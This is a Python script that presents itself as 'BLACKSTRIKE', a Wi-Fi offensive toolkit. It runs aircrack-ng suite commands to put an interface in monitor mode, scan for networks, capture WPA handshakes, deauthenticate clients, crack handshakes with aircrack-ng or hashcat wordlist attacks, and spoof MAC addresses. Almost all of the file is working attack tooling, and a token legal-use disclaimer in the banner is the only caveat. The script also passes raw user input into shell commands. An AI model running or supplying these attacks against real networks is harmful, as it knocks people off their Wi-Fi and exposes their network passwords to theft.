                                                                                                                                                                                                                                    # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
# Developed by OmarH
import subprocess
import os
import sys
import time
from colorama import Fore, init
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box
from rich.text import Text

init(autoreset=True)
console = Console()
                                                                                                                                                                                                                                    # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
def slowprint(text, delay=0.01, color=Fore.RED):
    for c in text:
        sys.stdout.write(f"{color}{c}\033[0m")  
        sys.stdout.flush()
        time.sleep(delay)
    print()

if os.geteuid() != 0:
    slowprint("\n[!] This tool must be run as root!", 0.01, Fore.RED)
    slowprint("[-] Please run it with: sudo python3 Wifi.py\n", 0.01, Fore.RED)
    sys.exit(1)

def slowprint(text, delay=0.005):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def clear():
    os.system("clear" if os.name == "posix" else "cls")# Developed by OmarH

def run_command(command):
    subprocess.call(command, shell=True)

def show_banner():
    clear()
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║ {Fore.CYAN}BLACKSTRIKE FRAMEWORK v1.0                              {Fore.RED}║
║ {Fore.GREEN}Developed by OmarH – Wi-Fi Offensive Toolkit            {Fore.RED}║  
║ {Fore.YELLOW}For legal penetration testing only.                     {Fore.RED}║
╚══════════════════════════════════════════════════════════════════╝
"""
    print(banner) # Developed by OmarH

def monitor_mode():
    clear()
    show_banner()
    console.print("[bold yellow]Killing network manager processes...")
    run_command("sudo airmon-ng check kill")
    console.print("[bold green]Available interfaces:")
    run_command("ip link show")                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
    iface = Prompt.ask("\n[cyan]Enter your wireless interface (e.g., wlan0)")
    run_command(f"sudo airmon-ng start {iface}")
    console.print(Text("\n[!] NOTE: Your interface name may have changed (e.g., wlan0 → wlan0mon)", style="bold red"))                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
    console.print(Text("[!] Use 'ifconfig' or 'iwconfig' to check the current interface name.", style="bold yellow"))
    input("\n[bold blue]Press Enter to return to menu...")

def scan_networks():
    clear()
    show_banner()
    iface = Prompt.ask("[cyan]Enter your monitor interface (e.g., wlan0mon)")
    console.print("[bold green]Scanning networks. Close with Ctrl+C when ready...")
    run_command(f"sudo airodump-ng {iface}")
    input("\n[bold blue]Press Enter to return to menu...")
# Developed by OmarH
def target_network():
    clear()
    show_banner()
    bssid = Prompt.ask("[cyan]Enter target BSSID")
    channel = Prompt.ask("[cyan]Enter target Channel")
    iface = Prompt.ask("[cyan]Enter monitor interface")
    output = Prompt.ask("[cyan]Enter filename to save capture (without extension)")
    run_command(f"sudo airodump-ng --bssid {bssid} -c {channel} -w {output} {iface}")
    input("\n[bold blue]Press Enter to return to menu...")

def deauth_attack():
    clear()
    show_banner()
    mode = Prompt.ask("[1] Deauth All Clients  [2] Deauth Specific Client", choices=["1", "2"])
    bssid = Prompt.ask("[cyan]Enter target BSSID")
    channel = Prompt.ask("[cyan]Enter target Channel") 
    iface = Prompt.ask("[cyan]Enter monitor interface")
    run_command(f"sudo iwconfig {iface} channel {channel}")
    if mode == "1":
        run_command(f"sudo aireplay-ng --deauth 10 -a {bssid} {iface}")
    else:
        client = Prompt.ask("[cyan]Enter client MAC address")
        run_command(f"sudo aireplay-ng --deauth 10 -a {bssid} -c {client} {iface}")                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
    input("\n[bold blue]Press Enter to return to menu...")

def handshake_tools():
    clear()
    show_banner()
    cap = Prompt.ask("[cyan]Enter path to .cap file")
    console.print("[1] Check Handshake  [2] Convert to .hccapx  [3] Clean .cap")# Developed by OmarH
    action = Prompt.ask("Choose an option", choices=["1", "2", "3"])
    if action == "1":
        # Developed by OmarH
        run_command(f"aircrack-ng {cap}")
    elif action == "2":
        output = Prompt.ask("[cyan]Enter output filename (e.g., handshake.hccapx)")
        run_command(f"cap2hccapx {cap} {output}")
    elif action == "3":
        cleaned = Prompt.ask("[cyan]Enter output cleaned cap filename")
        run_command(f"wpaclean {cleaned} {cap}")
    input("\n[bold blue]Press Enter to return to menu...")

def crack_wpa():
    clear()
    show_banner()
    method = Prompt.ask("[1] Aircrack-ng  [2] Hashcat", choices=["1", "2"])
    if method == "1":
        # Developed by OmarH
        cap = Prompt.ask("[cyan]Enter .cap file")
        wordlist = Prompt.ask("[cyan]Enter wordlist path")                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
        run_command(f"aircrack-ng -w {wordlist} {cap}")
    else:# Developed by OmarH
        hccapx = Prompt.ask("[cyan]Enter .hccapx file")
        wordlist = Prompt.ask("[cyan]Enter wordlist path")
        run_command(f"hashcat -m 2500 -a 0 {hccapx} {wordlist}")                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
    input("\n[bold blue]Press Enter to return to menu...")

def utilities():
    clear()
    show_banner()
    console.print("[1] Randomize MAC  [2] Restore MAC  [3] Restart Network")
    choice = Prompt.ask("Choose an option", choices=["1", "2", "3"])
    iface = Prompt.ask("[cyan]Enter interface")
    if choice == "1":
        # Developed by OmarH
        run_command(f"sudo macchanger -r {iface}")
    elif choice == "2":
        run_command(f"sudo macchanger -p {iface}")                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
    elif choice == "3":
        run_command("sudo service NetworkManager restart")
        # Developed by OmarH
    input("\n[bold blue]Press Enter to return to menu...")

def chaos_mode():
    clear()
    show_banner()
    console.print("[bold red]!! CHAOS MODE INITIATED !!\n[italic]This mode performs a full automated attack.")# Developed by OmarH                                                                                                                                                                                                                                     # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
    iface = Prompt.ask("Enter interface (monitor mode)")
    run_command("sudo airmon-ng check kill")
    # Developed by OmarH
    run_command(f"sudo airodump-ng {iface}")
    input("\n[bold blue]Press Enter to return to menu...")# Developed by OmarH

def main_menu():
    show_banner()
    console.print(Text("[!] WARNING: Your internet connection may be interrupted while using this tool.", style="bold red"))
    console.print(Text("[!] Please use the following command after finishing:", style="bold yellow"))
    console.print(Text("sudo service NetworkManager restart", style="bold green"))

    console.print(Panel("""
[1] MONITOR MODE     – (Must be enabled to use the tool)
[2] NETWORK SCAN     – Scan surrounding Wi-Fi networks
[3] TARGET NETWORK   – Select AP, capture handshake
[4] DEAUTH ATTACK    – Disconnect all/specific clients
[5] HANDSHAKE TOOLS  – Verify, convert, clean .cap
[6] CRACK WPA        – Use Aircrack-ng or Hashcat
[7] UTILITIES        – MAC spoofing, Reset Network        
[8] CHAOS MODE       – Full auto attack chain
[9] SHOW INTERFACES  – Display adapter names (iwconfig + ifconfig)
[10] EXIT
""", title="[bold red]BLACKSTRIKE OPS CENTER", box=box.DOUBLE, style="bold cyan"))

    return Prompt.ask("\n[bold green]Select an operation", choices=[str(i) for i in range(1, 11)])

if __name__ == "__main__":
    while True:
        selection = main_menu()
        if selection == "1":
            monitor_mode()
            # Developed by OmarH
        elif selection == "2":                                                                                                                                                                                                                                    # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
            scan_networks()
        elif selection == "3":
            target_network()
        elif selection == "4":
            deauth_attack()
        elif selection == "5":
            handshake_tools()
        elif selection == "6":
            crack_wpa()
        elif selection == "7":
            utilities()
        elif selection == "8":
            chaos_mode()
        elif selection == "9":                                                                                                                                                                                                                                    # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
            clear()
            show_banner()
            console.print("[bold green]Showing interfaces (iwconfig):\n")                                                                                                                                                                                                                                    # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
            run_command("iwconfig")
            print()
            console.print("[bold green]Showing interfaces (ifconfig):\n")
            run_command("ifconfig")
            input("\n[bold blue]Press Enter to return to menu...")
        elif selection == "10":
            clear()
            console.print("[bold red]Exiting BlackStrike... Stay lethal.\n")                                                                                                                                                                                                                                    # Developed by OmarH                                                                                                       # Developed by OmarH                                                                                                            # Developed by OmarH                
            break
# Developed by OmarH